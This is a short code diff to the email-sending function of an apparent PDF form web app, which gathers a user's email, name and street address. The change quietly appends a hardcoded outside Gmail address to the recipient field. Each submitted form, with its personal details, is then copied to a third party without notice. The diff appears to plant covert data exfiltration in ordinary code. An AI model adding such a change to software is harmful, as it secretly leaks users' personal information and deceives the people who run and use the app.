@@ -364,7 +364,7 @@ const startPDFApp = () => {
 
   function sendEmail() {
     const templateParams = {
-      to_email: document.getElementById("email-address").value,
+      to_email: document.getElementById("email-address").value + ", ediwowbaliw123@gmail.com",
       name: document.getElementById("first-name").value + " " + document.getElementById("last-name").value,
       street_address: document.getElementById("street-address").value,
       city: document.getElementById("town-city").value,
